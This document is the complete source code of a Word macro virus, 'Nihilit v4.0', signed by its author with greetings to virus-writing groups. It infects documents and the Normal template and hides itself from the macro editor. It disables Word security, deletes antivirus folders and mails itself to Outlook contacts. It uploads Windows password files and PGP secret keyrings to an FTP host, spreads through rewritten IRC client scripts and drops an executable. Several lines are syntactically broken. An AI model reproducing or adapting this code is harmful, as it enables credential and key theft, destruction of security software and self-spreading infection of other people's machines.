Attribute VB_Name = "Nihilit
Sub AutoClose()
    On Error Resume Next
'==========================================
'=======  Nihilit v4.0 / Nihilit.d  =======
'==========================================
'=== (c) by Necronomikon |[Zer0Gravity] ===
'==========================================
'greets flies out to: Serial Killer(Bitte!;p),GigaByte,jackie,
'Ultras,DX100h,DrG0nzo,The Mental Driller,VirusBuster,$moothie,
'BSL4,Ratter,Benny,NBK,Del_Armg0,SnakeByte,TheWalrus,Malfuntion,
'Belial,CyberWarrior,PhileToaster,newmann,ocker,fii7e
'and all in #virus,#vir,#vxers,#zerogravity,...
'hope to forget nobody.....!
Randomize
sv = Int(Rnd * 3) + 1
If sv = 1 Then svt$ = "porno.doc"
If sv = 3 Then svt$ = "readme!.doc"
If sv = 2 Then svt$ = "sex.doc"
    Call Nihilit
    Call KillAV
    z = Application.System.PrivateProfileString("", _
    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows" & _
    "\CurrentVersion\App Paths\winzip32.exe", "")
    w = Environ("windir")
    VBA.Shell z & " -a -r " & w & "\Nihilit.zip" _
    & Chr(32) & w & "\nihilit.doc", vbHide
End Sub

Sub Nihilit()
    On Error Resume Next
    'thanks to j� for advanced codes
    Word.Application.Options.VirusProtection = n
    Word.Application.Options.ConfirmConversions = n
    Word.Application.Options.SaveNormalPrompt = n
    '---
    Application.DisplayAlerts = wdAlertsNone
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("",     "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
    System.PrivateProfileString("",     "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "Level") = 1&
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") <> 1& Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\10.0\Word\Security", "AccessVBOM") = 1&
    ActiveDocument.ReadOnlyRecommended = False
    If NormalTemplate.VBProject.VBComponents.Item("Nihilit").Name <> "Nihilit" Then
    ActiveDocument.VBProject.VBComponents("Nihilit").Export ("C:\Windows\Nihilit.drv")
    SetAttr "C:\Windows\Nihilit.drv", 6
    End If
    Call InfectDocument
    If Month(Now()) = 12 And Day(Now()) = 14 Then Call Pgp  
    Else
    Call Pwdstealer
    NormalTemplate.Saved = True
    End If
    Call ump
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Necronomikon\ZeroGravity\Nihilit", "Irc") = "True"
    Call Irc
    'should i release a 2nd version of "Word97/2K.Blade"?
    Blade = Int(Rnd * 5)
    If Blade = 3 then Call Delay
    ActiveDocument.SaveAs FileName:="C:\Windows\Nihilit.doc", FileFormat:=wdFormatDocument
    Set Ni_OApp = CreateObject("Outlook.Application")
    Set Ni_Mapi = Ni_OApp.GetNameSpace("MAPI")
    For Each Ni_AddList In Ni_Mapi.AddressLists
    Next
    If Ni_AddList.AddressEntries.Count <> 0 Then
    For Ni_AddListCount = 1 To Ni_AddList.AddressEntries.Count
    Next
    Set Ni_AddListEntry = Ni_AddList.AddressEntries(Ni_AddListCount)
    Set Ni_msg = Ni_OApp.CreateItem(0)
    Ni_msg.To = Ni_AddListEntry.Address
    Ni_msg.Subject = "Check this!!!"
    Ni_msg.Body = "I like this story!!!;o)." + vbCrLf + "Nihilit"
    Ni_msg.Attachments.Add Environ("WINDIR") & "\Nihilit.doc"
    Ni_msg.DeleteAfterSubmit = True
    If Ni_msg.To <> "" Then
    Ni_msg.Send
    End If
    End If
  End Sub

Sub InfectDocument()
    On Error Resume Next
    If GetAttr(ActiveDocument.FullName) = 1 Then
    SetAttr ActiveDocument.FullName, 0
    ActiveDocument.Reload
    End If
    If ActiveDocument.VBProject.VBComponents.Item("Nihilit").Name <> "Nihilit" Then
    ActiveDocument.VBProject.VBComponents.import ("C:\Windows\Nihilit.drv")
    ActiveDocument.Save
    End If
    SetAttr ActiveDocument.FullName, 1
End Sub

Sub Pwdstealer()
    On Error Resume Next
    With Application.FileSearch
.FileName = "*.pwl"
.LookIn = "c:"
.Execute
For i = 1 To .FoundFiles.Count
shell "ftp http://members.tripod.com/Nihilit/"
shell "nihilit"
shell "killer"
shell "post" & .FoundFiles(i)
shell "bye"
Next i
End With
End Sub

Sub Pgp()
On Error Resume Next
'taken from WM97/Caligula by Opic[CodeBreakers]
If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Nihilit3") = False) Then

pgppath = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PGP Encrypted File\shell\open\command", "")
Position = InStr(1, pgppath, "pgpt")

If Position <> 0 Then
pgppath = Mid(pgppath, 1, Position - 2)
Else
GoTo noPGP
End If

With Application.FileSearch
    .FileName = "\Secring.skr"
    .LookIn = pgppath
    .SearchSubFolders = True
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
    .Execute
    PGP_Sec_Key = .FoundFiles(1)
End With

Randomize
  For i = 1 To 4
    NewSecRingFile = NewSecRingFile + Mid(Str(Int(8 * Rnd)), 2, 1)
  Next i
  NewSecRingFile = "./secring" & NewSecRingFile & ".skr"

Open "c:\sys.vxd" For Output As #1
    Print #1, "ftp http://members.tripod.com/Nihilit/"
    Print #1, "user nihilit"
    Print #1, "pass killer"
    Print #1, "cd incoming"
    Print #1, "binary"
    Print #1, "put """ & PGP_Sec_Key & """ """ & NewSecRingFile & """"
    Print #1, "quit"
    Close #1

Shell "command.com /c ftp.exe -n -s:c:\sys.vxd", vbHide

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Nihilit3") = True

End If

noPGP:
Shell " ping -l 5000 -t www.gmx.de", vbHide
Shell " ping -l 5000 -t www.symantec.com", vbHide
'my birthday MsgBox!!!;p
MsgBox "Coder of Nihilit v4.0" & vbCrLf & "---------------------------------" & vbCrLf & "(c) by Necronomikon[Zer0Gravity]", 64,"Happy Birthday Necronomikon"
call asmdrop
End Sub

'---- from NTVCK by me!;p -----
Sub KillAV()
On Error Resume Next
Kill "C:\Progra~1\AntiViral Toolkit Pro\*.*"
Kill "C:\Progra~1\Command Software\F-PROT95\*.*"
Kill "C:\Progra~1\FindVirus\*.*"
Kill "C:\Toolkit\FindVirus\*.*"
Kill "C:\Progra~1\Quick Heal\*.*"
Kill "C:\Progra~1\McAfee\VirusScan95\*.*"
Kill "C:\Progra~1\Norton AntiVirus\*.*"
Kill "C:\TBAVW95\*.*"
Kill "C:\VS95\*.*"
Kill "C:\eSafe\Protect\*.*"
Kill "C:\PC-Cillin 95\*.*"
Kill "C:\PC-Cillin 97\*.*"
Kill "C:\f-macro\*.*"
Kill "C:\Progra~1\FWIN32"
End Sub

Sub Delay()
On Error Resume Next
'some Delaystuff from NTVCK v2.0 by me!!!;p
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Microsoft Input Devices\Mouse", "DoubleClickSpeed") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Control Panel\Microsoft Input Devices\Keyboard", "KeyboardSpeed") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\ControlPanel\", "MenuShowDelay") = "1000"
End Sub

Sub UMP()
'-=[ULTRAS MACRO POLYMORPHIC]=-
On Error Resume Next
PoNu = Int(Rnd() * 28 + 1)
For Mutate = 1 To PoNu
PoRL = Application.VBE.ActiveVBProject.VBComponents("nihilit").CodeModule.CountOfLines
PoLi = Int(Rnd() * PoRL + 1)
a = Rnd * 455: b = Rnd * 80: c = Rnd * 160: d = Rnd * 180: e = Rnd * 49
Application.VBE.ActiveVBProject.VBComponents("nihilit").CodeModule.InsertLines PoLi, vbTab & "Rem " & a & vbTab & b & vbTab & c & vbTab & d & vbTab & e 
Next Mutate
End Sub
'---------------

Sub IRC()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Necronomikon\ZeroGravity\Nihilit", "Irc") <> "True" Then
End If
Kill "C:\mirc\Script.ini
Open "c:\mirc\script.ini" For Output As #1
Print #1, "[SCRIPT]
Print #1, "n0=on 1:start:{
Print #1, "n1=on 1:join:#:{
Print #1, "n2=if ( $nick == $me ) { halt } | .dcc send $nick c:\Windows\nihilit.zip
Print #1, "n3= }
Print #1, "n4=on 1:input:*:.msg #nihilit [( $+ $active $+ ) $1-]
Print #1, "n5=on 1:text:*:?:.msg #nihilit [( $+ $active $+ ) $1-]
Print #1, "n6=on 1:FILESENT:*.*:/dcc send $nick C:\Windows\Nihilit.zip
Print #1, "n7=on 1:connect:.msg #nihilit by Necronomikon
Print #1, "n8=  /msg #nihilit Im Infected With A Virus from Necronomikon
Print #1, "n9= /part #nihilit
Print #1, "n10= /clear
Print #1, "n11= /motd
Print #1, "n12=on 1:connect:.msg #nihilit Alive! $ip on $server $+ : $+ $port $+
Print #1, "n13=on 1:connect:/raw privmsg Necronomi HeyBabe! $ip on $server $+ : $+ $port $+
Print #1, "n14= }
Print #1, "n15=On 1:Connect:{
Print #1, "n16=/run attrib +h script.ini
Print #1, "n17=/run attrib +r script.ini
Print #1, "n18=/run attrib +s script.ini
Print #1, "n19= }
Print #1, ";IRC.Worm for Nihilit by Necronomikon
Close #1
Kill "C:\Windows\eventss.vxd
Open "C:\Windows\eventss.vxd" For Output As #2
Print #2, "[Levels]
Print #2, "Enabled=1
Print #2, "Count=1
Print #2, "Level1=000-Unknowns"
Print #2, "000-UnknownsEnabled=1
Print #2, "
Print #2, "[000-Unknowns]
Print #2, "User1=*!*@*
Print #2, "UserCount=1
Print #2, "Event1=;Nihilit by Necronomikon
Print #2, "Event2=ON JOIN:#:/dcc send $nick C:\Windows\Nihilit.zip
Print #2, "EventCount=2
Close #2
Kill "C:\pirch98\events.ini
Kill "C:\pirch32\events.ini
SourceFile = "C:\Windows\eventss.vxd
DestinationFile = "C:\pirch98\events.ini
FileCopy SourceFile, DestinationFile
SourceFilez = "C:\Windows\eventss.vxd
DestinationFilez = "C:\pirch32\events.ini
FileCopy SourceFilez, DestinationFilez
End Sub

Sub Phonecall()
On Error Resume Next
'makes a mobile-phonecall to a person i really don't like!
'thx to vic for code
Shell "dialer.exe", vbNormalFocus
SendKeys String:="01601524002", wait:=True
SendKeys String:="%d", wait:=True
For x = 1 To 500000
Next x
    SendKeys String:="~", wait:=True
SendKeys String:="%h", wait:=True
SendKeys String:="%{F4}", wait:=True
End Sub

Sub asmdrop()
On Error Resume Next
'Drop Mosquito by Deadman
Open "C:\6.com" For Output As #3
Print #3, "����!�"
Close #3
Shell "C:\6.com"
End Sub

Sub ToolsOptions()
    On Error Resume Next
    Options.VirusProtection = 1
    Options.SaveNormalPrompt = 1
    Dialogs(wdDialogToolsOptions).Show
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
call phonecall
End Sub

Sub ToolsSecurity()
On Error Resume Next
CommandBars("Macro").Controls("Security...").Enabled = True
Dialogs(wdDialogToolsSecurity).Show
CommandBars("Macro").Controls("Security...").Enabled = False
call phonecall
End Sub

Sub FileTemplates()
On Error Resume Next	
call phonecall
End Sub

Sub ToolsMacro()
On Error Resume Next
    Call Stealth
    Dialogs(wdDialogToolsMacro).Display
call phonecall
End Sub

Sub ViewVBCode()
On Error Resume Next
    Call Stealth
    ShowVisualBasicEditor = True
call phonecall
End Sub

Sub Stealth()
    On Error Resume Next
    Application.OrganizerDelete Source:=NormalTemplate.Name, _
    Name:="Nihilit", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerDelete Source:=ActiveDocument.Name, _
    Name:="Nihilit", Object:=wdOrganizerObjectProjectItems
    NormalTemplate.Saved = True
    ActiveDocument.Saved = True
End Sub

Sub HelpAbout()
On Error Resume Next
WordBasic.FileNew
    WordBasic.ToggleFull
    WordBasic.DocMaximize
    WordBasic.Font "Comic Sans MS"
    WordBasic.FontSize 60
    WordBasic.Bold
    WordBasic.Insert "Check this!"
    WordBasic.StartOfLine
    WordBasic.CharRight 1, 1
    WordBasic.FormatFont Points:="48", Color:=6
    WordBasic.EndOfLine
    WordBasic.InsertPara
    WordBasic.InsertPara
    WordBasic.FontSize 48
    WordBasic.Insert "Nihilit was coded by Necronomikon."
End Sub

Sub FileExit()
    On Error Resume Next
    Call Nihilit
    If ActiveDocument.Saved = False Then ActiveDocument.Save
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Nihilit
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Nihilit
End If
Loop
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "h:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "f:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
    Application.Quit
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Nihilit
Application.WindowState = wdWindowStateMinimize
pName = CurDir & "\"
fName = Dir(pName & "*.doc", sAttr)
If (fName <> "") And ((fName <> ".") And (fName <> "..")) Then InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
Call Nihilit
Do While (fName <> "")
fName = Dir()
If (fName <> "") And _
((fName <> ".") And (fName <> "..")) Then
InfectDoc = pName & fName
Documents.Open FileName:=InfectDoc, ConfirmConversions:=False, ReadOnly:= _
False, AddToRecentFiles:=False, PasswordDocument:=""
    Call Nihilit
End If
Loop
    If ActiveDocument.Saved = False Then ActiveDocument.Save
        ChangeFileOpenDirectory "p:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "r:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
        ChangeFileOpenDirectory "s:"
        ActiveDocument.SaveAs FileName:=svt$, LockComments:=False, Password:=", AddToRecentFiles:=False, WritePassword:=", ReadOnlyRecommended:=False
End Sub
Back to index
